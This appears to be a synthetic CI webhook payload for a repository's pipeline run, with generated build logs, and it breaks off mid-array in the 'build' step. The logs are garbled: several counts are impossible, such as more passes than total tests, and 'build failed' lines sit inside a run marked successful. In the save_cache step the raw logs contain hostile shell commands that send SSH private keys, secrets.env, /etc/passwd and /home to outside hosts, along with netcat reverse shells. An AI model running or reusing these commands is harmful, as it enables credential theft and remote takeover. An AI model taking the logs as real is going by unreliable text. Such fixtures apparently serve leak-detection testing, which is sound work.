{
  "action": "completed",
  "workflow_run": {
    "id": 882,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-574",
    "head_sha": "a2cf6e7ba14772bfc6ff407397a4e27c26bd6f5f",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-30T12:20:10.658225Z",
    "updated_at": "2025-11-30T12:23:15.184243Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nCache restored successfully (368MB)\nPushing to registry...\nFinished.\nCompiling components/service.java...\n[12:20:10] DEBUG: Loading configuration\nLayer 9/8: COPY command\nStep 20/24: Building\n[12:20:10] INFO: Processing request\nPOST /api - 201 (347ms)\nLayer 7/14: RUN command\n\u2713 All checks passed\nTest Suites: 50 passed, 21 total\nImage pulled successfully\nGET /health - 204 (89ms)\nnpm install: resolved 1819 packages\n[12:20:10] DEBUG: Connection pool: 7 active\npip: Collecting react\nStep 5/21: Installing dependencies\nWARNING: react has known vulnerabilities\n[12:20:10] DEBUG: Query executed in 8ms\nCache saved successfully\nGenerating source maps...\nConnection established\nMinifying main.js\nBuilding Docker image...\nyarn add: Done in 11.63s\nCache miss for key-1599\nInstalling express@2.13.6\nNODE_ENV=development\nHEAD is now at d3ab5dc\nReady.\nStep 7/22: Deploying\nProcessing...\nCache miss for key-2838\n\u2713 deploy completed\nPlatform: darwin-arm64\n[12:20:10] INFO: Processing request\nStep 4/15: Testing\nUsing Node.js 18.15.2\nConnection established\nPlatform: darwin-arm64\nTransforming 985 files...\n\u2713 Task completed in 4220ms\nStep 8/20: Testing\n[12:20:10] INFO: Request completed\nConnection established\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nCompleted.\n\u2713 Task completed in 4256ms\nCompiling utils/utils.go...\nTests: 431 passed, 165 total\npip: Downloading webpack-1.16.tar.gz\nProcessing...\nCompiling components/app.ts...\n  PASS: unit/test_auth_login.spec.js\nCache restored successfully (129MB)\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 25 passed, 13 total\n\u2717 build failed with exit code 49\nInstalling axios@5.0.3\n\u2713 Step 'checkout' succeeded\nStep 8/23: Deploying\nCache miss for key-7715\nCache restored successfully (321MB)\npip: Installing build dependencies...\n[12:20:10] WARN: Deprecated API usage\nOK\nLoading...\nVerifying...\nWaiting...\nStep 8/21: Installing dependencies\nGET /api - 200 (40ms)\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (46MB)\nUsing Python 3.11\nnpm notice: package.json updated\nPOST /data - 201 (317ms)\n[12:20:10] DEBUG: Query executed in 17ms\nCache miss for key-9167\n\u2713 Step 'install' succeeded\nCache miss for key-9656\n[12:20:10] INFO: Connecting to database\nProcessing...\nOK\n[12:20:10] INFO: Cache refreshed\nFetching submodules...\n[12:20:10] DEBUG: Query executed in 55ms\nCompiling components/service.java...\nCache miss for key-3252\n\u2713 Task completed in 4342ms\nDone.\nStep 2/22: Installing dependencies\n=== Step deploy_production completed ===\n=== Step: install_dependencies ===\nSuccess!\nVerifying...\n\u2713 All checks passed\nLoading...\nCompiling lib/service.java...\nPOST /data - 200 (316ms)\nStep 15/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'feature/task-701'\n\u2713 Task completed in 4247ms\nFAILED: test_cache_hit\nDone.\nTime: 113.790s\nImage pulled successfully\n[12:20:10] INFO: Request completed\nLoading...\nCache saved successfully\nImage pulled successfully\nLoading...\nSuccess!\nWaiting...\nProcessing...\npip install: Successfully installed lodash-5.3\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nConnection established\n[12:20:10] INFO: Connecting to database\nTests: 219 passed, 488 total\nnpm install: added 83 packages\nAlready up to date.\n[12:20:10] INFO: Cache refreshed\nConnection established\nStep 1/25: Installing dependencies\nCompiling utils/service.java...\n[12:20:10] ERROR: Connection failed\nOptimizing 30 modules...\nFinished.\nnpm install: added 134 packages\nStep 19/15: Installing dependencies\nCache miss for key-3568\nOptimizing 80 modules...\nStep 19/23: Testing\nCache invalidated: node_modules\nAlready up to date.\nMinifying app.js\nAlready up to date.\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nImage pulled successfully\nyarn add: Done in 25.56s\nArtifact uploaded: build.tar.gz (5MB)\nyarn add: Done in 25.7s\nUsing Node.js 19.20.8\nMinifying vendor.js\nImage pulled successfully\nGET /health - 201 (76ms)\nArtifact uploaded: build.tar.gz (17MB)\nStep 7/17: Testing\nCache hit for key-4331\nArtifact uploaded: dist.zip (9MB)\nCreating production build...\nPOST /data - 201 (383ms)\nProcessing...\nArtifact downloaded: 22MB\nNODE_ENV=test\nStep 6/21: Testing\nBuilding Docker image...\n[12:20:10] INFO: Cache refreshed\nCompiling utils/index.js...\nTime: 106.598s\npip install: Successfully installed react-5.7\nCache hit for key-6043\n[12:20:10] INFO: Connecting to database\nCache restored successfully (279MB)\n\u2713 Task completed in 2788ms\nMinifying app.js\nCache miss for key-2647\nOK\n[12:20:10] INFO: Processing request\n[12:20:10] ERROR: Connection failed\nCompiling src/main.py...\nChecking out develop branch\nPushing to registry...\nWaiting...\nCache restored successfully (293MB)\n\u2713 Step 'setup' succeeded\nPulling image: python:latest\n[12:20:10] ERROR: Connection failed\nStep 8/22: Testing\n[12:20:10] DEBUG: Query executed in 93ms\nDone.\nUploading artifact 'dist' (19 files)\nCache miss for key-3568\nTransforming 570 files...\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nConnection established\n[12:20:10] DEBUG: Initializing service\nException: RuntimeError\nOptimizing 15 modules...\nCreating production build...\n\u2713 Step 'test' succeeded\nChecking out master branch\nTests: 193 passed, 92 total\nTransforming 835 files...\nBuilding Docker image...\nOptimizing 80 modules...\n[12:20:10] INFO: Cache refreshed\n\u2713 Task completed in 3027ms\nCache hit for key-1251\nProcessing...\n  PASS: e2e/test_cache_hit.spec.js\nStep 8/25: Linting\nVerifying...\nPulling image: python:18\n[12:20:10] WARN: Deprecated API usage\nCache hit for key-1803\n[12:20:10] DEBUG: Connection pool: 1 active\npip: Downloading webpack-1.8.tar.gz\nCreating production build...\nyarn add: Done in 30.29s\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: lodash has known vulnerabilities\nHEAD is now at 2388fe6\n[12:20:10] DEBUG: Query executed in 45ms\nSnapshots: 38 passed, 38 total\nCache miss for key-9681\nTLS handshake completed\nCompiling components/handler.rs...\npip: Downloading jest-3.7.tar.gz\nUsing Python 3.12\nPushing to registry...\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nArtifact uploaded: dist.zip (58MB)\nCreating production build...\nArtifact uploaded: build.tar.gz (10MB)\nGenerating source maps...\n\u2713 Step 'checkout' succeeded\nEnvironment: production\n[12:20:10] DEBUG: Query executed in 4ms\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nNODE_ENV=test\nCache invalidated: build\nCoverage: 84% statements, 73% branches\nLayer 5/14: ENV command\nnpm install: resolved 334 packages\nGenerating source maps...\nSwitched to branch 'hotfix/task-692'\nUploading artifact 'build' (28 files)\nCache restored successfully (291MB)\n[12:20:10] DEBUG: Memory usage: 343MB\nTime: 84.42s\nFetching submodules...\nCache saved successfully\nWARNING: eslint has known vulnerabilities\nPOST /data - 202 (144ms)\nInstalling express@1.10.7\nTest Suites: 50 passed, 31 total\nLayer 3/15: RUN command\nReady.\n[12:20:10] INFO: Starting build process\nNODE_ENV=production\nNODE_ENV=development\nCache restored successfully (70MB)\n[12:20:10] DEBUG: Loading configuration\n\u2713 All checks passed\nEnvironment: test\nStep 10/15: Running migrations\nnpm notice: created a lockfile\nSuccess!\nUsing Python 3.11\nCache invalidated: node_modules\nSwitched to branch 'hotfix/task-474'\n[12:20:10] DEBUG: Query executed in 89ms\nChecking out develop branch\npip: Installing build dependencies...\nRan 150 tests in 51s\nCompiling src/index.js...\nTime: 42.272s\nCreating production build...\n[12:20:10] ERROR: Connection failed\nHEAD is now at f1f53db\nArtifact downloaded: 17MB\nUsing Python 3.12\nCache miss for key-8995\n  PASS: unit/test_user_create.spec.js\nTLS handshake completed\n=== Step unit_tests completed ===\n=== Step: build ===\n\u2713 lint completed\n[12:20:10] WARN: Deprecated API usage\nCache restored successfully (172MB)\nPulling image: node:latest\nyarn add: Done in 30.73s\n[12:20:10] INFO: Request completed\nOptimizing 31 modules...\nBuilding Docker image...\n[12:20:10] INFO: Connecting to database\npip: Downloading jest-5.14.tar.gz\nCache invalidated: dependencies\nArtifact uploaded: dist.zip (72MB)\nOK\nConnection established\nStep 12/21: Running migrations\nLoading...\npip: Downloading webpack-2.6.tar.gz\nTest Suites: 39 passed, 16 total\nStep 10/25: Building\nLoading...\nPOST /api - 201 (96ms)\nCompiling components/utils.go...\nLoading...\nCache miss for key-4653\nConnection established\nConnecting to acme.corp:443...\nUploading artifact 'coverage' (26 files)\nnpm install: added 348 packages\nStep 6/15: Testing\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] INFO: Starting build process\nLoading...\n[12:20:10] INFO: Connecting to database\nyarn add: Done in 20.78s\nCompiling lib/app.ts...\nUsing Node.js 20.1.4\n[12:20:10] DEBUG: Memory usage: 667MB\nCache saved successfully\nInstalling react@1.11.5\nLayer 4/10: RUN command\nWARNING: react has known vulnerabilities\nyarn add: Done in 19.61s\n[12:20:10] DEBUG: Loading configuration\nLayer 1/14: RUN command\nTests: 223 passed, 275 total\nEnvironment: production\n=== Step build completed ===\n=== Step: type_check ===\n[12:20:10] ERROR: Connection failed\n[12:20:10] ERROR: Connection failed\nCompleted.\nArtifact uploaded: dist.zip (19MB)\nStep 18/22: Running migrations\n  PASS: test_cache_hit (19ms)\nOptimizing 75 modules...\nProcessing...\nVerifying...\nWARNING: express has known vulnerabilities\n[12:20:10] INFO: Connecting to database\nGET /health - 204 (71ms)\nArtifact uploaded: build.tar.gz (5MB)\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\npip: Collecting axios\nFetching submodules...\nAlready up to date.\n[12:20:10] INFO: Starting build process\nChecking out main branch\nStep 13/25: Linting\nNODE_ENV=test\nStep 10/23: Building\nConnection established\nPlatform: linux-x64\n[12:20:10] INFO: Starting build process\nCache invalidated: node_modules\nCompiling lib/handler.rs...\nCache restored successfully (309MB)\nStep 4/19: Installing dependencies\n[12:20:10] INFO: Request completed\nStep 10/21: Running migrations\nFinished.\n[12:20:10] INFO: Request completed\nStep 19/19: Deploying\nStep 16/17: Building\nArtifact uploaded: dist.zip (92MB)\npip: Collecting webpack\nCompiling src/main.py...\nPulling image: python:3.11\nCompiling components/main.py...\nCreating production build...\nSnapshots: 36 passed, 40 total\nStep 6/24: Deploying\nOptimizing 40 modules...\nInstalling lodash@4.20.8\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nGenerating source maps...\nBundling vendor.js\n[12:20:10] DEBUG: Memory usage: 1739MB\n[12:20:10] INFO: Request completed\nSwitched to branch 'bugfix/task-517'\nPushing to registry...\nUploading artifact 'coverage' (2 files)\nBuilding Docker image...\n[12:20:10] DEBUG: Loading configuration\nCache miss for key-1052\n[12:20:10] DEBUG: Initializing service\nnpm notice: package.json updated\nCompiling utils/service.java...\n[12:20:10] ERROR: Connection failed\nSuccess!\nPlatform: darwin-arm64\nUsing Node.js 17.20.6\nTransforming 598 files...\nMinifying vendor.js\nStep 16/17: Deploying\n[12:20:10] INFO: Cache refreshed\nStep 6/19: Installing dependencies\n[12:20:10] DEBUG: Connection pool: 10 active\nCache invalidated: dependencies\nPlatform: darwin-arm64\nnpm install: resolved 1550 packages\nCoverage: 72% statements, 64% branches\nnpm notice: package.json updated\nReady.\nConnecting to test.io:443...\nFetching submodules...\nWARNING: axios has known vulnerabilities\nCache hit for key-7232\n[12:20:10] DEBUG: Connection pool: 18 active\nVerifying...\nArtifact uploaded: build.tar.gz (40MB)\nTLS handshake completed\nCache miss for key-6323\n[12:20:10] DEBUG: Connection pool: 7 active\nArtifact downloaded: 27MB\nArtifact downloaded: 44MB\nInstalling lodash@4.5.10\nTLS handshake completed\nSnapshots: 43 passed, 48 total\n[12:20:10] INFO: Processing request\nLoading...\n=== Step upload_artifacts completed ===\n=== Step: checkout ===\nException: RuntimeError\n[12:20:10] DEBUG: Initializing service\nChecking out main branch\npip install: Successfully installed axios-2.0\n\u2713 deploy completed\nCompleted.\nSuccess!\nInstalling react@5.9.10\n[12:20:10] WARN: Deprecated API usage\nCompiling utils/index.js...\nTLS handshake completed\n\u2713 Task completed in 2201ms\nOptimizing 64 modules...\nArtifact downloaded: 27MB\nStep 5/15: Testing\nConnection established\n[12:20:10] INFO: Processing request\nWaiting...\npip install: Successfully installed eslint-2.2\npip: Downloading lodash-2.6.tar.gz\nTests: 345 passed, 61 total\n\u2713 Task completed in 4241ms\nConnection established\nCache restored successfully (149MB)\nUsing Node.js 14.19.8\n  PASS: e2e/test_cache_hit.spec.js\nGET /status - 204 (69ms)\nBundling styles.css\npip install: Successfully installed webpack-4.3\n[12:20:10] INFO: Cache refreshed\nBundling styles.js\nArtifact uploaded: dist.zip (26MB)\nArtifact downloaded: 15MB\nReady.\nTransforming 438 files...\nCompleted.\nGenerating source maps...\nVerifying...\nProcessing...\n[12:20:10] DEBUG: Query executed in 15ms\n[12:20:10] INFO: Processing request\nInstalling react@5.6.9\nTransforming 808 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 108.382s\nBuilding Docker image...\n=== Step checkout completed ===\n=== Step: lint ===\nVerifying...\n[12:20:10] DEBUG: Connection pool: 6 active\n\u2717 build failed with exit code 124\n[12:20:10] INFO: Request completed\nVerifying...\nImage pulled successfully\nTransforming 505 files...\n[12:20:10] WARN: Deprecated API usage\nTime: 52.511s\nCompiling lib/service.java...\n[12:20:10] WARN: Deprecated API usage\nRan 163 tests in 8s\nCache saved successfully\nStep 18/25: Installing dependencies\nGenerating source maps...\nReady.\nPushing to registry...\nRan 81 tests in 54s\nWARNING: jest has known vulnerabilities\nSuccess!\n[12:20:10] DEBUG: Query executed in 51ms\nVerifying...\nStep 6/25: Running migrations\nProcessing...\nyarn add: Done in 21.22s\nFetching submodules...\nHEAD is now at 3148647\nStep 8/18: Running migrations\n[12:20:10] INFO: Cache refreshed\nCompiling utils/index.js...\nStep 3/18: Installing dependencies\n  PASS: integration/test_api_health.spec.js\nHEAD is now at 1a1f39f\nPOST /data - 200 (235ms)\nAlready up to date.\nCache saved successfully\nGET /status - 204 (69ms)\nProcessing...\nAlready up to date.\nCache invalidated: node_modules\nStep 8/23: Building\nOK\nCache invalidated: build\n\u2713 All checks passed\nOK\nCoverage: 79% statements, 66% branches\n=== Step lint completed ===\n=== Step: setup_environment ===\nLoading...\nCache saved successfully\nWaiting...\nLayer 2/10: RUN command\nTest Suites: 19 passed, 8 total\nSnapshots: 25 passed, 39 total\nStep 1/20: Testing\npip: Collecting lodash\nProcessing...\nConnecting to example.com:443...\n[12:20:10] INFO: Cache refreshed\nSnapshots: 16 passed, 6 total\n[12:20:10] DEBUG: Initializing service\nVerifying...\nPushing to registry...\nAlready up to date.\nDone.\npip install: Successfully installed eslint-3.9\nStep 5/25: Installing dependencies\nNODE_ENV=test\n[12:20:10] WARN: Deprecated API usage\n\u2713 Task completed in 2493ms\nCache miss for key-6077\nHEAD is now at 15bfbb3\nInstalling jest@1.5.10\n[12:20:10] INFO: Starting build process\nCache invalidated: node_modules\n  PASS: test_cache_hit (142ms)\n  PASS: test_auth_login (448ms)\nCompiling src/utils.go...\nStep 15/17: Installing dependencies\nUploading artifact 'build' (17 files)\nEnvironment: test\nSnapshots: 3 passed, 28 total\nnpm install: resolved 1021 packages\nStep 19/20: Installing dependencies\nnpm install: resolved 521 packages\nCompiling utils/app.ts...\n[12:20:10] DEBUG: Initializing service\nCompiling lib/handler.rs...\n[12:20:10] INFO: Cache refreshed\nyarn add: Done in 28.74s\nException: TypeError\n\u2713 build completed\nArtifact downloaded: 7MB\nnpm notice: created a lockfile\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\n[12:20:10] WARN: Deprecated API usage\nCache restored successfully (288MB)\nyarn add: Done in 12.43s\nMinifying main.js\nUsing Python 3.9\nFinished.\npip: Collecting react\nCompiling components/service.java...\nCoverage: 92% statements, 76% branches\nFetching submodules...\nSwitched to branch 'hotfix/task-436'\n[12:20:10] WARN: Deprecated API usage\nTest Suites: 19 passed, 9 total\nNODE_ENV=test\nStep 9/25: Linting\nAlready up to date.\nCoverage: 75% statements, 92% branches\nHEAD is now at f13fd84\nTLS handshake completed\nStep 18/16: Building\n[12:20:10] INFO: Request completed\nUploading artifact 'dist' (19 files)\nSuccess!\nArtifact uploaded: build.tar.gz (34MB)\nVerifying...\nCache saved successfully\npip: Installing build dependencies...\nUploading artifact 'build' (17 files)\nHEAD is now at 614957b\nPOST /upload - 201 (318ms)\nDone.\nHEAD is now at e84cff2\n[12:20:10] INFO: Processing request\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 115\nSuccess!\nTests: 248 passed, 466 total\nGenerating source maps...\nVerifying...\nUsing Python 3.12\nCompiling lib/main.py...\nnpm notice: package.json updated\nException: RuntimeError\n[12:20:10] WARN: Deprecated API usage\nArtifact downloaded: 20MB\nCache invalidated: dependencies\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nEnvironment: test\nCache invalidated: build\n[12:20:10] INFO: Cache refreshed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 90.4.224.183 11374\n  PASS: test_auth_login (167ms)\nEnvironment: staging\nStep 4/20: Deploying\ncurl -X POST https://test.io/collect -d @secrets.env\nAlready up to date.\nGenerating source maps...\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nWARNING: axios has known vulnerabilities\nVerifying...\ncurl -X POST https://acme.corp/collect -d @secrets.env\nMinifying vendor.js\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nArtifact downloaded: 11MB\necho $(cat ~/.ssh/id_rsa) | base64 | nc 64.100.169.214 54702\nnc -e /bin/sh 122.33.162.135 33808\nUsing Node.js 17.18.4\necho $(cat ~/.ssh/id_rsa) | base64 | nc 40.101.114.226 1521\nFetching submodules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 40.137.118.246 35212\n\u2713 build completed\n[12:20:10] DEBUG: Initializing service\n  PASS: test_api_health (477ms)\n\u2717 build failed with exit code 52\nLayer 5/8: RUN command\nWARNING: prettier has known vulnerabilities\nCoverage: 83% statements, 91% branches\nCoverage: 70% statements, 78% branches\nFinished.\nEnvironment: development\npip install: Successfully installed prettier-5.7\nBuilding Docker image...\nVerifying...\n[12:20:10] DEBUG: Query executed in 23ms\nnpm install: resolved 1716 packages\nReady.\nnc -e /bin/sh 155.117.252.174 56286\nSending 468MB of data to example.com\n[12:20:10] INFO: Cache refreshed\nTransforming 900 files...\n[12:20:10] INFO: Cache refreshed\n[12:20:10] INFO: Request completed\nPulling image: node:18\necho $(cat ~/.ssh/id_rsa) | base64 | nc 1.139.86.197 17351\n  PASS: integration/test_auth_login.spec.js\nStep 20/21: Building\nDone.\nFAILED: test_user_create\nSending 285MB of data to acme.corp\nArtifact uploaded: build.tar.gz (37MB)\nWARNING: jest has known vulnerabilities\nStep 11/20: Installing dependencies\nSending 331MB of data to startup.dev\nAlready up to date.\nTLS handshake completed\n[12:20:10] INFO: Processing request\nPushing to registry...\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-30T12:20:10.658225",
        "finished_at": "2025-11-30T12:20:20.169875",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache restored successfully (368MB)",
          "Pushing to registry...",
          "Finished.",
          "Compiling components/service.java...",
          "[12:20:10] DEBUG: Loading configuration",
          "Layer 9/8: COPY command",
          "Step 20/24: Building",
          "[12:20:10] INFO: Processing request",
          "POST /api - 201 (347ms)",
          "Layer 7/14: RUN command",
          "\u2713 All checks passed",
          "Test Suites: 50 passed, 21 total",
          "Image pulled successfully",
          "GET /health - 204 (89ms)",
          "npm install: resolved 1819 packages",
          "[12:20:10] DEBUG: Connection pool: 7 active",
          "pip: Collecting react",
          "Step 5/21: Installing dependencies",
          "WARNING: react has known vulnerabilities",
          "[12:20:10] DEBUG: Query executed in 8ms",
          "Cache saved successfully",
          "Generating source maps...",
          "Connection established",
          "Minifying main.js",
          "Building Docker image...",
          "yarn add: Done in 11.63s",
          "Cache miss for key-1599",
          "Installing express@2.13.6",
          "NODE_ENV=development",
          "HEAD is now at d3ab5dc",
          "Ready.",
          "Step 7/22: Deploying",
          "Processing...",
          "Cache miss for key-2838",
          "\u2713 deploy completed",
          "Platform: darwin-arm64",
          "[12:20:10] INFO: Processing request",
          "Step 4/15: Testing",
          "Using Node.js 18.15.2",
          "Connection established",
          "Platform: darwin-arm64",
          "Transforming 985 files...",
          "\u2713 Task completed in 4220ms",
          "Step 8/20: Testing",
          "[12:20:10] INFO: Request completed",
          "Connection established",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-30T12:20:20.169875",
        "finished_at": "2025-11-30T12:20:23.974535",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Completed.",
          "\u2713 Task completed in 4256ms",
          "Compiling utils/utils.go...",
          "Tests: 431 passed, 165 total",
          "pip: Downloading webpack-1.16.tar.gz",
          "Processing...",
          "Compiling components/app.ts...",
          "  PASS: unit/test_auth_login.spec.js",
          "Cache restored successfully (129MB)",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 25 passed, 13 total",
          "\u2717 build failed with exit code 49",
          "Installing axios@5.0.3",
          "\u2713 Step 'checkout' succeeded",
          "Step 8/23: Deploying",
          "Cache miss for key-7715",
          "Cache restored successfully (321MB)",
          "pip: Installing build dependencies...",
          "[12:20:10] WARN: Deprecated API usage",
          "OK",
          "Loading...",
          "Verifying...",
          "Waiting...",
          "Step 8/21: Installing dependencies",
          "GET /api - 200 (40ms)",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Using Python 3.11",
          "npm notice: package.json updated",
          "POST /data - 201 (317ms)",
          "[12:20:10] DEBUG: Query executed in 17ms",
          "Cache miss for key-9167",
          "\u2713 Step 'install' succeeded",
          "Cache miss for key-9656",
          "[12:20:10] INFO: Connecting to database",
          "Processing...",
          "OK",
          "[12:20:10] INFO: Cache refreshed",
          "Fetching submodules...",
          "[12:20:10] DEBUG: Query executed in 55ms",
          "Compiling components/service.java...",
          "Cache miss for key-3252",
          "\u2713 Task completed in 4342ms",
          "Done.",
          "Step 2/22: Installing dependencies",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-30T12:20:23.974535",
        "finished_at": "2025-11-30T12:20:52.509486",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Success!",
          "Verifying...",
          "\u2713 All checks passed",
          "Loading...",
          "Compiling lib/service.java...",
          "POST /data - 200 (316ms)",
          "Step 15/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'feature/task-701'",
          "\u2713 Task completed in 4247ms",
          "FAILED: test_cache_hit",
          "Done.",
          "Time: 113.790s",
          "Image pulled successfully",
          "[12:20:10] INFO: Request completed",
          "Loading...",
          "Cache saved successfully",
          "Image pulled successfully",
          "Loading...",
          "Success!",
          "Waiting...",
          "Processing...",
          "pip install: Successfully installed lodash-5.3",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "Connection established",
          "[12:20:10] INFO: Connecting to database",
          "Tests: 219 passed, 488 total",
          "npm install: added 83 packages",
          "Already up to date.",
          "[12:20:10] INFO: Cache refreshed",
          "Connection established",
          "Step 1/25: Installing dependencies",
          "Compiling utils/service.java...",
          "[12:20:10] ERROR: Connection failed",
          "Optimizing 30 modules...",
          "Finished.",
          "npm install: added 134 packages",
          "Step 19/15: Installing dependencies",
          "Cache miss for key-3568",
          "Optimizing 80 modules...",
          "Step 19/23: Testing",
          "Cache invalidated: node_modules",
          "Already up to date.",
          "Minifying app.js",
          "Already up to date.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-30T12:20:52.509486",
        "finished_at": "2025-11-30T12:21:02.021136",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Image pulled successfully",
          "yarn add: Done in 25.56s",
          "Artifact uploaded: build.tar.gz (5MB)",
          "yarn add: Done in 25.7s",
          "Using Node.js 19.20.8",
          "Minifying vendor.js",
          "Image pulled successfully",
          "GET /health - 201 (76ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 7/17: Testing",
          "Cache hit for key-4331",
          "Artifact uploaded: dist.zip (9MB)",
          "Creating production build...",
          "POST /data - 201 (383ms)",
          "Processing...",
          "Artifact downloaded: 22MB",
          "NODE_ENV=test",
          "Step 6/21: Testing",
          "Building Docker image...",
          "[12:20:10] INFO: Cache refreshed",
          "Compiling utils/index.js...",
          "Time: 106.598s",
          "pip install: Successfully installed react-5.7",
          "Cache hit for key-6043",
          "[12:20:10] INFO: Connecting to database",
          "Cache restored successfully (279MB)",
          "\u2713 Task completed in 2788ms",
          "Minifying app.js",
          "Cache miss for key-2647",
          "OK",
          "[12:20:10] INFO: Processing request",
          "[12:20:10] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Checking out develop branch",
          "Pushing to registry...",
          "Waiting...",
          "Cache restored successfully (293MB)",
          "\u2713 Step 'setup' succeeded",
          "Pulling image: python:latest",
          "[12:20:10] ERROR: Connection failed",
          "Step 8/22: Testing",
          "[12:20:10] DEBUG: Query executed in 93ms",
          "Done.",
          "Uploading artifact 'dist' (19 files)",
          "Cache miss for key-3568",
          "Transforming 570 files...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-30T12:21:02.021136",
        "finished_at": "2025-11-30T12:21:21.044437",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Connection established",
          "[12:20:10] DEBUG: Initializing service",
          "Exception: RuntimeError",
          "Optimizing 15 modules...",
          "Creating production build...",
          "\u2713 Step 'test' succeeded",
          "Checking out master branch",
          "Tests: 193 passed, 92 total",
          "Transforming 835 files...",
          "Building Docker image...",
          "Optimizing 80 modules...",
          "[12:20:10] INFO: Cache refreshed",
          "\u2713 Task completed in 3027ms",
          "Cache hit for key-1251",
          "Processing...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 8/25: Linting",
          "Verifying...",
          "Pulling image: python:18",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache hit for key-1803",
          "[12:20:10] DEBUG: Connection pool: 1 active",
          "pip: Downloading webpack-1.8.tar.gz",
          "Creating production build...",
          "yarn add: Done in 30.29s",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: lodash has known vulnerabilities",
          "HEAD is now at 2388fe6",
          "[12:20:10] DEBUG: Query executed in 45ms",
          "Snapshots: 38 passed, 38 total",
          "Cache miss for key-9681",
          "TLS handshake completed",
          "Compiling components/handler.rs...",
          "pip: Downloading jest-3.7.tar.gz",
          "Using Python 3.12",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: dist.zip (58MB)",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Generating source maps...",
          "\u2713 Step 'checkout' succeeded",
          "Environment: production",
          "[12:20:10] DEBUG: Query executed in 4ms",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-30T12:21:21.044437",
        "finished_at": "2025-11-30T12:21:49.579388",
        "log_lines": [
          "=== Step: unit_tests ===",
          "NODE_ENV=test",
          "Cache invalidated: build",
          "Coverage: 84% statements, 73% branches",
          "Layer 5/14: ENV command",
          "npm install: resolved 334 packages",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-692'",
          "Uploading artifact 'build' (28 files)",
          "Cache restored successfully (291MB)",
          "[12:20:10] DEBUG: Memory usage: 343MB",
          "Time: 84.42s",
          "Fetching submodules...",
          "Cache saved successfully",
          "WARNING: eslint has known vulnerabilities",
          "POST /data - 202 (144ms)",
          "Installing express@1.10.7",
          "Test Suites: 50 passed, 31 total",
          "Layer 3/15: RUN command",
          "Ready.",
          "[12:20:10] INFO: Starting build process",
          "NODE_ENV=production",
          "NODE_ENV=development",
          "Cache restored successfully (70MB)",
          "[12:20:10] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Environment: test",
          "Step 10/15: Running migrations",
          "npm notice: created a lockfile",
          "Success!",
          "Using Python 3.11",
          "Cache invalidated: node_modules",
          "Switched to branch 'hotfix/task-474'",
          "[12:20:10] DEBUG: Query executed in 89ms",
          "Checking out develop branch",
          "pip: Installing build dependencies...",
          "Ran 150 tests in 51s",
          "Compiling src/index.js...",
          "Time: 42.272s",
          "Creating production build...",
          "[12:20:10] ERROR: Connection failed",
          "HEAD is now at f1f53db",
          "Artifact downloaded: 17MB",
          "Using Python 3.12",
          "Cache miss for key-8995",
          "  PASS: unit/test_user_create.spec.js",
          "TLS handshake completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-30T12:21:49.579388",
        "finished_at": "2025-11-30T12:22:18.114339",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 lint completed",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache restored successfully (172MB)",
